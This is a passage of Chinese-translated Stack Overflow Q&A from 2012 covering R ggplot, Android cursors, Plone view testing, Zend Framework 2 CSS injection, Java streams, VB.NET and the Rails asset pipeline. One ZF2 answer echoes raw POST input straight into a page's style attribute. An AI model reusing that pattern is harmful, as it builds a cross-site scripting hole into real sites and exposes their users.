x8.p.m <-structure(list(Var.1 = structure(c(2L, 4L, 5L, 3L, 1L, 2L, 4L, 
5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 
3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 
1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 
2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 
4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 
5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 
3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 
1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 
2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L, 2L, 4L, 5L, 3L, 1L), .Label = c("Extremely Dis-Satistfied", 
"Highly Satisfied", "Moderately Dis-Satisfied", "Moderately Satisfied", 
"Satisfied"), class = "factor"), Var.2 = structure(c(1L, 1L, 
1L, 1L, 1L, 2L, 2L, 2L, 2L, 2L, 3L, 3L, 3L, 3L, 3L, 4L, 4L, 4L, 
4L, 4L, 5L, 5L, 5L, 5L, 5L, 6L, 6L, 6L, 6L, 6L, 1L, 1L, 1L, 1L, 
1L, 2L, 2L, 2L, 2L, 2L, 3L, 3L, 3L, 3L, 3L, 4L, 4L, 4L, 4L, 4L, 
5L, 5L, 5L, 5L, 5L, 6L, 6L, 6L, 6L, 6L, 1L, 1L, 1L, 1L, 1L, 2L, 
2L, 2L, 2L, 2L, 3L, 3L, 3L, 3L, 3L, 4L, 4L, 4L, 4L, 4L, 5L, 5L, 
5L, 5L, 5L, 6L, 6L, 6L, 6L, 6L, 1L, 1L, 1L, 1L, 1L, 2L, 2L, 2L, 
2L, 2L, 3L, 3L, 3L, 3L, 3L, 4L, 4L, 4L, 4L, 4L, 5L, 5L, 5L, 5L, 
5L, 6L, 6L, 6L, 6L, 6L, 1L, 1L, 1L, 1L, 1L, 2L, 2L, 2L, 2L, 2L, 
3L, 3L, 3L, 3L, 3L, 4L, 4L, 4L, 4L, 4L, 5L, 5L, 5L, 5L, 5L, 6L, 
6L, 6L, 6L, 6L), .Label = c("I've changed for work/ a new job/ gone on a work plan", 
"I want a phone that 2degrees doesn't offer", "I want Best Mates/ Favourites", 
"I was offered or saw a better offer on another network", "Issues with the 2degrees network (poor coverage)", 
"Other"), class = "factor"), YearQuarter = structure(c(15218, 
15218, 15218, 15218, 15218, 15218, 15218, 15218, 15218, 15218, 
15218, 15218, 15218, 15218, 15218, 15218, 15218, 15218, 15218, 
15218, 15218, 15218, 15218, 15218, 15218, 15218, 15218, 15218, 
15218, 15218, 15309, 15309, 15309, 15309, 15309, 15309, 15309, 
15309, 15309, 15309, 15309, 15309, 15309, 15309, 15309, 15309, 
15309, 15309, 15309, 15309, 15309, 15309, 15309, 15309, 15309, 
15309, 15309, 15309, 15309, 15309, 15400, 15400, 15400, 15400, 
15400, 15400, 15400, 15400, 15400, 15400, 15400, 15400, 15400, 
15400, 15400, 15400, 15400, 15400, 15400, 15400, 15400, 15400, 
15400, 15400, 15400, 15400, 15400, 15400, 15400, 15400, 15492, 
15492, 15492, 15492, 15492, 15492, 15492, 15492, 15492, 15492, 
15492, 15492, 15492, 15492, 15492, 15492, 15492, 15492, 15492, 
15492, 15492, 15492, 15492, 15492, 15492, 15492, 15492, 15492, 
15492, 15492, 15584, 15584, 15584, 15584, 15584, 15584, 15584, 
15584, 15584, 15584, 15584, 15584, 15584, 15584, 15584, 15584, 
15584, 15584, 15584, 15584, 15584, 15584, 15584, 15584, 15584, 
15584, 15584, 15584, 15584, 15584), class = "Date"), value = c(70, 
20, 7, 2, 2, 54, 33, 8, 0, 4, 37, 29, 23, 11, 0, 46, 29, 18, 
4, 2, 16, 29, 26, 20, 10, 37, 20, 9, 13, 22, 66, 18, 14, 2, 0, 
65, 20, 12, 3, 0, 47, 29, 18, 4, 3, 48, 32, 16, 3, 1, 24, 25, 
19, 22, 10, 41, 14, 18, 9, 18, 66, 25, 6, 3, 0, 62, 23, 14, 1, 
0, 47, 30, 14, 8, 1, 46, 31, 16, 6, 1, 19, 27, 25, 22, 7, 34, 
15, 17, 13, 21, 68, 22, 7, 2, 1, 62, 21, 16, 1, 0, 45, 30, 18, 
5, 1, 43, 28, 22, 5, 2, 20, 23, 25, 23, 10, 36, 20, 12, 14, 19, 
60, 25, 13, 2, 0, 62, 23, 10, 6, 0, 41, 24, 26, 9, 0, 47, 31, 
16, 5, 1, 13, 29, 22, 24, 13, 28, 16, 20, 18, 18)), .Names = c("Var.1", 
"Var.2", "YearQuarter", "value"), row.names = c(NA, -150L), class = "data.frame")
> 

ggplot(data=x8.p.m, aes(x=YearQuarter, y=value, fill=Var.1)) + geom_bar(stat="identity",position="stack")+facet_wrap(~Var.2) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:42:13.477

首先检查您的因子水平：

```
levels(x8.p.m$Var.1) 
```

然后查看这篇博文：[链接-点击这里-](http://trinkerrstuff.wordpress.com/2012/10/15/how-do-i-re-arrange-ordering-a-plot/)

PS这不是`ggplot2`问题，因为您将在帖子中阅读。

# javascript - RailwayJS & Cradle 不工作错误

> ID：13328531
> 
> 赞同：1
> 
> 时间：2012-11-11T04:17:28.627
> 
> 标签：javascript, node.js, couchdb, cradle, railway.js

我正在尝试使用带有 railjs 的 couchdb 的底座适配器，但它不起作用。这是基本安装，我已经安装了底座。

```
database.json
{ "development":
  { "driver":   "cradle"
  }
, "test":
  { "driver":   "memory"
  }
, "production":
  { "driver":   "memory"
  }
}

$ railway server 8888
Error while executing /cms/npmfile.js
Error while executing npmfile.js

/cms/node_modules/railway/lib/railway_utils.js:168
        throw e;
              ^
TypeError: Cannot read property 'freezeSchema' of undefined
    at Schema.freeze (/cms/node_modules/jugglingdb/lib/schema.js:325:21)
    at module.exports.displayWarning (/cms/node_modules/jugglingdb/lib/railway.js:78:12)
    at Array.forEach (native)
    at init (/cms/node_modules/jugglingdb/lib/railway.js:77:22)
    at Object.exports.init (/cms/node_modules/jugglingdb/index.js:14:29)
    at ctx.require (/cms/node_modules/railway/lib/extensions.js:38:17)
    at npmfile.js:2:1
    at Script.Object.keys.forEach.(anonymous function) [as runInNewContext] (vm.js:41:22)
    at Object.runCode (/cms/node_modules/railway/lib/railway_utils.js:165:11)
    at Object.exports.init (/cms/node_modules/railway/lib/extensions.js:21:15) 
```

有任何想法吗？

# android - 使用后台服务将单元格设为静音

> ID：13328533
> 
> 赞同：0
> 
> 时间：2012-11-11T04:18:11.897
> 
> 标签：android, database, cursor

因此，我将当前位置与存储在数据库中的位置进行比较。一切正常，但是当我使用模拟器控件发送位置时，我无法使单元格静音。Logcat 说光标是 OutOfBounds

这是我的代码

```
 Cursor cur=null;
            cur=y.rawQuery("SELECT longitude FROM data",null);
            cur.moveToFirst();
            cr=y.rawQuery("SELECT latitude FROM data",null);
            cr.moveToFirst();
            while(!cr.isAfterLast()) {

                arlist.add(cr.getDouble(cr.getColumnIndex("latitude")));
                cr.moveToNext();
                }
            while(!cur.isAfterLast()) {

                arrylist.add(cr.getDouble(cr.getColumnIndex("longitude")));
                cur.moveToNext();
                }
            for(int i=0;i<arlist.size();i++){
                Location locB = new Location("point B");
                locB.setLatitude(arlist.get(i));
                locB.setLongitude(arrylist.get(i));
                float distance=loc.distanceTo(locB);
                if(distance<5){
                    ((AudioManager) getSystemService(AUDIO_SERVICE))
                      .setRingerMode(AudioManager.RINGER_MODE_SILENT);
                }
                else{
                    ((AudioManager) getSystemService(AUDIO_SERVICE))
                      .setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
                }

            } 
```

这是我的日志猫

```
11-11 09:45:16.528: E/AndroidRuntime(692): FATAL EXCEPTION: main
11-11 09:45:16.528: E/AndroidRuntime(692): android.database.CursorIndexOutOfBoundsException: Index 20 requested, with a size of 20
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.database.AbstractCursor.checkPosition(AbstractCursor.java:418)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.database.AbstractWindowedCursor.checkPosition(AbstractWindowedCursor.java:136)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.database.AbstractWindowedCursor.getDouble(AbstractWindowedCursor.java:86)
11-11 09:45:16.528: E/AndroidRuntime(692):  at com.example.alert.service$MyLocationListener.onLocationChanged(service.java:90)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.location.LocationManager$ListenerTransport._handleMessage(LocationManager.java:237)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.location.LocationManager$ListenerTransport.access$000(LocationManager.java:170)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.location.LocationManager$ListenerTransport$1.handleMessage(LocationManager.java:186)
11-11 09:45:16.528: E/AndroidRuntime(692):  at  android.os.Handler.dispatchMessage(Handler.java:99)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.os.Looper.loop(Looper.java:137)
11-11 09:45:16.528: E/AndroidRuntime(692):  at android.app.ActivityThread.main(ActivityThread.java:4745)
11-11 09:45:16.528: E/AndroidRuntime(692):  at java.lang.reflect.Method.invokeNative(Native Method)
11-11 09:45:16.528: E/AndroidRuntime(692):  at java.lang.reflect.Method.invoke(Method.java:511)
11-11 09:45:16.528: E/AndroidRuntime(692):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
11-11 09:45:16.528: E/AndroidRuntime(692):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
11-11 09:45:16.528: E/AndroidRuntime(692):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:22:47.913

我认为问题出在这个循环中，您正在循环`cur`但试图从中检索`cr`：

```
while(!cur.isAfterLast()) {
    arrylist.add(cr.getDouble(cr.getColumnIndex("longitude")));
    cur.moveToNext();
} 
```

应该是：

```
while(!cur.isAfterLast()) {
    arrylist.add(cur.getDouble(cur.getColumnIndex("longitude")));
    cur.moveToNext();
} 
```

# python - plone.app.testing 无法调用 BrowserView

> ID：13328534
> 
> 赞同：5
> 
> 时间：2012-11-11T04:18:19.440
> 
> 标签：python, testing, plone

我通过 paste 添加了几个 BrowserViews，现在我尝试从 plone.app.testing 运行它们，因为我喜欢可重复和一致的测试。从浏览器手动调用视图没有任何问题。

我尝试过手动导入和初始化视图，以及从受限遍历中调用类。在这两种情况下，对象都可以很好地初始化，但是当我尝试触发渲染时，将实例作为函数调用或使用 __call__() 方法，我收到以下错误：

```
*** KeyError: 'global_cache_settings 
```

我查看了 plone.app.testing 中 README.rst 中的示例，它似乎没有提到问题，快速谷歌搜索也没有产生任何结果。它可能是站点自定义之一，但是在查找源代码时，我发现 Products.CMFPlone 中提到了“global_cache_settings”，所以这可能是一个克隆的事情：

```
eggs/Products.CMFPlone-4.1.4-py2.6.egg/Products/CMFPlone/skins/plone_templates/main_template.pt
28:  <metal:cache use-macro="context/global_cache_settings/macros/cacheheaders">
29:    Get the global cache headers located in global_cache_settings.

eggs/plone.app.layout-2.1.13-py2.6.egg/plone/app/layout/presentation/presentation.pt
11:    <metal:cache use-macro="here/global_cache_settings/macros/cacheheaders">
12:        Get the global cache headers located in global_cache_settings.

eggs/plonetheme.sunburst-1.1.6-py2.6.egg/plonetheme/sunburst/skins/sunburst_templates/main_template.pt
20:    <metal:cache use-macro="context/global_cache_settings/macros/cacheheaders">
21:    Get the global cache headers located in global_cache_settings. 
```

这是相关的类声明：

```
from zope.interface import implements, Interface

from Products.Five import BrowserView
from Products.CMFCore.utils import getToolByName
from Products.Five.browser.pagetemplatefile import ViewPageTemplateFile
from Products.MyProduct import MyProductMessageFactory as _

class IPromoBoardHome(Interface):
    """
    PromoBoardHome view interface
    """
    def __init__(self, context, request):
        pass
    def __call__(self):
        pass
    def test():
        """ test method"""

class PromoBoardHome(BrowserView):
    """
    PromoBoardHome browser view
    """
    implements(IPromoBoardHome)

    def __init__(self, context, request):
        self.context = context
        self.request = request
    def __call__(self):
        return ViewPageTemplateFile('pt/promoboardhome.pt')(self)
    @property
    def portal_catalog(self):
        return getToolByName(self.context, 'portal_catalog')

    @property
    def portal(self):
        return getToolByName(self.context, 'portal_url').getPortalObject()

    def test(self):
        """
        test method
        """
        dummy = _(u'a dummy string')

        return {'dummy': dummy} 
```

模板：

```
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"
    lang="en"
    metal:use-macro="here/main_template/macros/master"
    i18n:domain="Products.MyProduct">
<body>
    <div metal:fill-slot="main">
        <tal:main-macro metal:define-macro="main"
                        tal:define="testview view/test">

            <span tal:content="testview/dummy">test</span>

        </tal:main-macro>
    </div>
</body>
</html> 
```

configure.zcml 声明：

```
<browser:page
    for="*"
    name="promoboardhome"
    class=".promoboardhome.PromoBoardHome"
    allowed_interface=".promoboardhome.IPromoBoardHome"
    permission="zope2.View"
/> 
```

测试文件：

```
import unittest2 as unittest
from . import PROD_INTEGRATION_TESTING

from plone.app.testing import setRoles, TEST_USER_ID

from Products.CMFCore.utils import getToolByName
from Products.MyProduct.browser.promoboardhome import PromoBoardHome

class TestPromoBoardHome(unittest.TestCase):
    layer = PROD_INTEGRATION_TESTING
    def setUp(self):
        self.portal = self.layer['portal']
    def test_call(self):
        pbh = self.portal.restrictedTraverse('@@promoboardhome')
        try:
            pbh()
        except KeyError:
            print "that didn't work!"
            import pdb; pdb.set_trace() 
```

我在这里做错了吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-15T12:40:53.417

浏览器视图只不过是命名的多适配器；要测试它们，您已经在正确的上下文中调用它们并手动设置请求以提供为视图声明的接口；在你的情况下可能是这样的：

```
from zope.interface import alsoProvides
from Products.MyProduct.browser.promoboardhome import IPromoBoardHome

class TestPromoBoardHome(unittest.TestCase):

    layer = PROD_INTEGRATION_TESTING

    def setUp(self):
        self.portal = self.layer['portal']
        self.request = self.layer['request']
        alsoProvides(self.request, IPromoBoardHome) 
```

我有一堆浏览器视图测试对像[collective.nitf](https://github.com/collective/collective.nitf/blob/master/src/collective/nitf/tests/test_views.py)这样的包进行了测试。

祝测试愉快！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T07:13:33.263

您可能想用 testbrowser 测试视图：

```
from plone.testing import z2
browser = z2.Browser(self.layer['app'])
browser.open(self.layer['portal'].absolute_url() + '/@@promoboardhome') 
```

或类似的。

# php - 从 zf2 模块中将 CSS 注入到布局中

> ID：13328535
> 
> 赞同：4
> 
> 时间：2012-11-11T04:18:29.383
> 
> 标签：php, zend-framework2

我几乎完成了为 zf2 编写一个非常简单的模块。我希望我的模块做的一件事是将一些 css 注入到布局中，以便它生成的 HTML 以更好的方式显示。

这可以从模块内完成吗？如果是这样，怎么做？

编辑：谢谢大家的及时回复。但是我想我可能没有很清楚地解释自己。当我说“注入一些 css”时，我的意思是获取一个 css 字符串并将其实际呈现在布局内部。我并不是说要链接到外部 css 文件或让资产经理像迄今为止的答案所建议的那样发布我的文件。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-11T15:59:55.200

请参阅[从 Zend Framework 2 中的模块发布资产](https://stackoverflow.com/questions/12301385/publishing-assets-from-modules-in-zend-framework-2)或[如何合并 Zend Framework 2 模块公共目录](https://stackoverflow.com/questions/10296920/how-to-merge-zend-framework-2-module-public-directories)，以讨论从模块推送公共资产的选项。

除了将您的模块资产推向公开之外，您还可以将 append 放入触发方法中，例如 onBootstrap：

```
public function onBootstrap($e) {
    $sm = $e->getApplication()->getServiceManager();
    $headLink = $sm->get('viewhelpermanager')->get('headLink');
    $headLink->appendStylesheet('/assets/MyModule/css/mystylesheet.css');
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-11T06:19:13.140

尝试使用类似的东西：

```
$sm = $this->getEvent()->getApplication()->getServiceManager();
$helper = $sm->get('viewhelpermanager')->get('headLink');
$helper->prependStylesheet('/css/mystylesheet.css'); 
```

在您的模块控制器中。

**编辑：**

如果您想在模块中存储 css 样式，您可以在布局文件（head 部分）中渲染它，或者更好的方法是在模块中创建另一个路由，例如`/get/style/[:name]`. 该路由指向另一个仅返回纯文本/css 文档的操作。或多或少 ：）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-22T19:51:25.667

将变量添加到您想要插入 CSS 的布局中：

```
<a href="#" style="<?php echo($this->CSS); ?>">Some Link</a> 
```

然后在您的控制器中，根据需要加载并分配它：

```
$this->layout()->CSS = "CSS";
$this->layout()->CSS = $this->getRequest()->getPost('CSStoInject');
$this->layout()->CSS = fopen(), curl(), etc. 
```

# java - 流对象初始化

> ID：13328536
> 
> 赞同：2
> 
> 时间：2012-11-11T04:18:49.343
> 
> 标签：java, object, stream, initialization

现在我在第 30 行和第 38 行收到编译时错误，表明“fin”可能尚未初始化。但是这样写是完美的

```
 import java.io.*;
    class CopyFile {
        public static void main(String args[]) throws IOException {
            int i;
            FileInputStream fin;//can't it be done like this?
            FileOutputStream fout= new FileOutputStream(args[1]);

            try{
                //open input file
                try{
                    fin = new FileInputStream(args[0]);
                }
                catch(FileNotFoundException e){
                    System.out.println("Input file Not Found");
                    return;
                }
                //open output file
                try{
                    fout = new FileOutputStream(args[1]);
                }
                catch(FileNotFoundException e){
                    System.out.println("Error Opening File");
                }
            }
            catch(ArrayIndexOutOfBoundsException e){
                System.out.println("usage: Copyfile From to");
            }
            try{
                do{
                    i = fin.read();
                    if(i!= -1)
                        fout.write(i);
                }while(i != -1);
            }
            catch(IOException e){
                System.out.println("file error");
            }
            fin.close();
            fout.close();
        }
    } 
```

我见过很多次这样初始化。我认为这是由于 try 块。

由于在 try 块中，它可能会错过初始化，从而导致错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:25:42.460

问题是你根本没有初始化`FileInputStream fin`。您的代码在编译器中将如下所示：

```
FileInputStream fin;
try {
    fin = ...
    //more code goes here...
} catch (...) {
    //exception handling...
} finally {
    fin.close(); //fin is not even null for the compiler
} 
```

为了使代码工作，至少用一个值初始化它，并在使用该方法之前`null`检查是否。`fin != null``close`

```
FileInputStream fin = null;
try {
    fin = ...
    //more code goes here...
} catch (...) {
    //exception handling...
} finally {
    if (fin != null) {
        fin.close(); //fin is not null, at least the JVM could close it
    }
} 
```

更多信息：

*   [Java：声明变量](http://java.about.com/od/understandingdatatypes/a/declaringvars.htm)
*   [Java中未初始化的变量和成员](https://stackoverflow.com/q/268814/1065197)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:35:35.570

不要对 if 使用 try catch，反之亦然。

Try/catch 用于在您无法控制的情况下出现问题并且这不是正常程序流程的一部分，例如写入已满的硬盘......

使用 if 进行正常的错误检查

在您的示例中，使用 if 块检查您的 args 数组，然后初始化您的 fin。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T04:21:17.263

`FileInputStream fin=null;`

分配它`null`或`FileInputStream`对象。

局部变量在使用前需要赋值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-11T04:21:36.570

尽管在第一个`try`块中，您正在初始化`fin`as `fin = new FileInputStream(args[0]);`，但您的嵌套语句会使编译器感到困惑。只需更新您的声明如下：

```
 FileInputStream fin = null; 
```

# javascript - 用 JavaScript 读取 Web Json

> ID：13328538
> 
> 赞同：0
> 
> 时间：2012-11-11T04:19:20.180
> 
> 标签：javascript, json

我想读取一个 JSON 文件（有点像在服务器上运行的 web 服务）并使用 JavaScript 处理它。

我想知道是否有人能指出一些好的例子、教程或示例代码？

非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:13:40.803

您可以使用 jQuery 的`$.getJSON`功能。请参阅[jQuery 文档](http://api.jquery.com/jQuery.getJSON/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:24:37.287

我不确定我是否完全理解你的问题，但如果你的 JS 中有一个可访问的字符串，你可以调用`JSON.parse(yourString)`它将返回字符串的 JS 对象表示。这应该适用于所有现代浏览器。

# iis - 一个网站，两个不同的域和一个子文件夹，可能吗？

> ID：13328539
> 
> 赞同：-1
> 
> 时间：2012-11-11T04:19:21.433
> 
> 标签：iis, subdomain, subdirectory

我想在两个域上建立一个网站，如下所示：www.abc.com/xyz 和 www.xyz.com

我不想做重定向。这可能吗？我正在使用 IIS。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:24:26.647

是的，可能...您需要 2 个单独的网站，并且您需要在第一个 (abv.com/xyz) 上设置一个指向 xyz.com 文件夹的虚拟文件夹

# ruby-on-rails-3 - 用户在主应用程序部分之前还是之后登录？

> ID：13328540
> 
> 赞同：1
> 
> 时间：2012-11-11T04:19:28.983
> 
> 标签：ruby-on-rails-3

理论问题。假设我构建了一个用于管理客户、产品、账单等的应用程序。全部无需用户登录。

主应用程序完成后是否有可能获得多用户（每个用户都有自己的客户、产品……）功能？还是我应该首先考虑多用户？这部分的导轨有多灵活？

在此先感谢 dennym

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T08:01:24.300

您要求的是一种称为多租户的模式。有不同的方法可以做到这一点，但 Rails 本身没有提供任何方法。

您可以从这张幻灯片开始：[http ://www.slideshare.net/tardate/multitenancy-with-rails](http://www.slideshare.net/tardate/multitenancy-with-rails)

并弄清楚你是否想这样做；基于数据、Rbac、模型或模式的分区。

有一个将它作为一种服务提供，它说在您拥有应用程序后很容易做到：[http ://railskits.com/saas/](http://railskits.com/saas/)

但根据我们的经验，它有点过时并且缺少一些我们想要的功能。

您还可以查看其他 gem，例如：multitenant 或 act_as_tenant。

我们最终使用了 act_as_tenant 并从一开始就这样做了。

# vb.net - 如何设置对象引用

> ID：13328545
> 
> 赞同：0
> 
> 时间：2012-11-11T04:20:34.427
> 
> 标签：vb.net

我不确定如何将对象引用设置为`frmD.Picture1.ClientRectangle`?? 我正在使用 win7 和 vb.net 2008

```
frmD.Picture1.ClientRectangle=new frmD.Picture1.ClientRectangle???             

            'error object reference not set ....
            xpos = frmD.Picture1.ClientRectangle.Left
            ypos = frmD.Picture1.ClientRectangle.Top 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:23:30.147

未将对象引用设置为对象的实例意味着您正在尝试访问未实例化对象的某些成员。这意味着您忘记创建对象（通过`new`）。

在您的情况下，您可能正在尝试使用它`frmD`或`Picture1`在它创建之前。

# vb.net - 如何从字典中检索 BindingSource 的对象

> ID：13328550
> 
> 赞同：0
> 
> 时间：2012-11-11T04:21:31.567
> 
> 标签：vb.net, dictionary, bindingsource

我有 BindingSource 和 Dictionary 两个对象。BindingSource 对象包含List of Vehicles 类对象的对象，Dictionary 对象包含BindingSource 类对象。这是全局声明：

```
 Dim bs As BindingSource
        Dim dicBinding As Dictionary(Of Integer,BindingSource) 
```

当用户单击名为“添加”的按钮时，我将车辆类的对象添加到 bs，然后将 bs 添加到 dicBinding：

```
 If bs Is Nothing Then bs = New BindingSource(New List(Of Vehicle),Nothing)
        If dicBinding is Nothing Then dicBinding = New Dictionary(Of integer,BindingSource)
        Dim i As Integer = dicBinding.Count
        dicBinding.Add(i,bs) 
```

当我想从 dicBinding 对象中检索 BindingSource 对象时：

```
 bs =TryCast(dicBinding.Item(0),BindingSource)

        For Each v As Vehicle In bs.List
            MessageBox.Show(v.VehicleId)
        Next 
```

但我无法找回。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:38:15.950

现在它更有意义了 :)`Dictionary`对象不能像数组一样被索引——它们没有像`Array`s 和`List`s 那样的内置顺序。

你有一个`Dictionary`，它的键是整数，它的值是`BindingSource`s。

```
Dim i As Integer = dicBinding.Count + 1
dicBinding.Add(i, bs) 
```

将一个元素添加到您`Dictionary`的值`bs`和键是`1`（假设`Dictionary`之前没有条目）。

当您请求时`dicBinding.Item(0)`，您要求的是键为 的值`0`，但您尚未添加一个。

# android - eclipse 找不到 stdarg.h

> ID：13328558
> 
> 赞同：2
> 
> 时间：2012-11-11T04:23:39.630
> 
> 标签：android, eclipse

我是 android ndk 的新手，我正在尝试制作一个完全原生的应用程序。我正在使用eclipse，我收到了这个警告：

```
Unresolved inclusion: <stdarg.h> 
```

以及我尝试在该标头中使用的类型的未知类型错误。

我想知道这里是否有人可以告诉我如何让 eclipse 找到 stdarg.h

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T04:39:50.727

添加路径和符号目录时出错

首先进入项目->属性->C/C++常规->路径和符号

然后加

```
${env_var:ANDROID_NDK}\toolchains\arm-linux-androideabi-4.4.3\prebuilt\windows\lib\gcc\arm-linux-androideabi\4.4.3\include 
```

适用于所有语言

# ruby-on-rails - 资产管道发挥作用

> ID：13328559
> 
> 赞同：1
> 
> 时间：2012-11-11T04:24:01.380
> 
> 标签：ruby-on-rails

好的，所以我的资产管道突然开始在我的开发机器上运行。以前工作的 JS 函数现在抛出“不是函数”错误。我知道我一定做错了什么。一分钟前，datatables jquery 函数正在工作，然后它抛出一个错误，然后它正在工作，现在它不工作或抛出一个错误。

这是我的 application.js

```
//= require jquery
//= require jquery-ui
//= require jquery_ujs
//= require_self
//= require_tree .
//= require dataTables/jquery.dataTables
//= require dataTables/jquery.dataTables.bootstrap
//= require bootstrap
//= require bootstrap-tooltip
//= require bootstrap-popover
//= require bootstrap-tab
//= require bootstrap-modal
//= require bootstrap-alert
//= require bootstrap-dropdown
//= require jquery.ui.addresspicker
//= require raty
//= require jquery.alphanumeric
//= require jquery.formrestrict
//= require select2
//= require chosen/chosen.jquery
//= require highcharts
//= require jquery.lazyload 
```

这是我的一些布局标题：

```
 <%= stylesheet_link_tag "application", media: "all" %>
  <%= yield(:scripthead) %>
  <%= javascript_include_tag "application" %>
  <%= csrf_meta_tags %>    
  <%= yield(:head) %> 
```

上面我使用yield从谷歌加载在线脚本，因为它们只在某些页面上需要，如果包含在应用程序布局中，通常会减慢网站速度。我尝试删除产量，但即使在清除浏览器缓存并运行 rake assets:clean （为了安全起见）之后，事情仍然被破坏。

这是 CSS 和元标记之间显示的内容（对于在 yield 脚本头中没有任何内容的页面）：

```
 <script src="/assets/jquery.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery-ui.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery_ujs.js?body=1" type="text/javascript"></script>
<script src="/assets/application.js?body=1" type="text/javascript"></script>
<script src="/assets/aidmodels.js?body=1" type="text/javascript"></script>
<script src="/assets/audio.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-alert.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-dropdown.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-modal.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-popover.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-tab.js?body=1" type="text/javascript"></script>
<script src="/assets/bootstrap-tooltip.js?body=1" type="text/javascript"></script>
<script src="/assets/branches.js?body=1" type="text/javascript"></script>
<script src="/assets/charts.js?body=1" type="text/javascript"></script>
<script src="/assets/chosen/backup_chosen.jquery.js?body=1" type="text/javascript"></script>
<script src="/assets/chosen/chosen.jquery.js?body=1" type="text/javascript"></script>
<script src="/assets/consumers.js?body=1" type="text/javascript"></script>
<script src="/assets/dispensers.js?body=1" type="text/javascript"></script>
<script src="/assets/favorites.js?body=1" type="text/javascript"></script>
<script src="/assets/features.js?body=1" type="text/javascript"></script>
<script src="/assets/generic_styles.js?body=1" type="text/javascript"></script>
<script src="/assets/gmaps4rails/gmaps4rails.base.js?body=1" type="text/javascript"></script>
<script src="/assets/gmaps4rails/gmaps4rails.bing.js?body=1" type="text/javascript"></script>
<script src="/assets/gmaps4rails/gmaps4rails.googlemaps.js?body=1" type="text/javascript"></script>
<script src="/assets/gmaps4rails/gmaps4rails.mapquest.js?body=1" type="text/javascript"></script>
<script src="/assets/gmaps4rails/gmaps4rails.openlayers.js?body=1" type="text/javascript"></script>
<script src="/assets/highcharts.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery-ui-1.8.18.custom.min.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.alphanumeric.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.formrestrict.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.lazyload.js?body=1" type="text/javascript"></script>
<script src="/assets/jquery.ui.addresspicker.js?body=1" type="text/javascript"></script>
<script src="/assets/likes.js?body=1" type="text/javascript"></script>
<script src="/assets/messages.js?body=1" type="text/javascript"></script>
<script src="/assets/overalls.js?body=1" type="text/javascript"></script>
<script src="/assets/pages.js?body=1" type="text/javascript"></script>
<script src="/assets/questions.js?body=1" type="text/javascript"></script>
<script src="/assets/raty.js?body=1" type="text/javascript"></script>
<script src="/assets/reviews.js?body=1" type="text/javascript"></script>
<script src="/assets/sessions.js?body=1" type="text/javascript"></script>
<script src="/assets/styles.js?body=1" type="text/javascript"></script>
<script src="/assets/tickets.js?body=1" type="text/javascript"></script>
<script src="/assets/universities.js?body=1" type="text/javascript"></script>
<script src="/assets/users.js?body=1" type="text/javascript"></script>
<script src="/assets/dataTables/jquery.dataTables.js?body=1" type="text/javascript"></script>
<script src="/assets/dataTables/jquery.dataTables.bootstrap.js?body=1" type="text/javascript"></script>
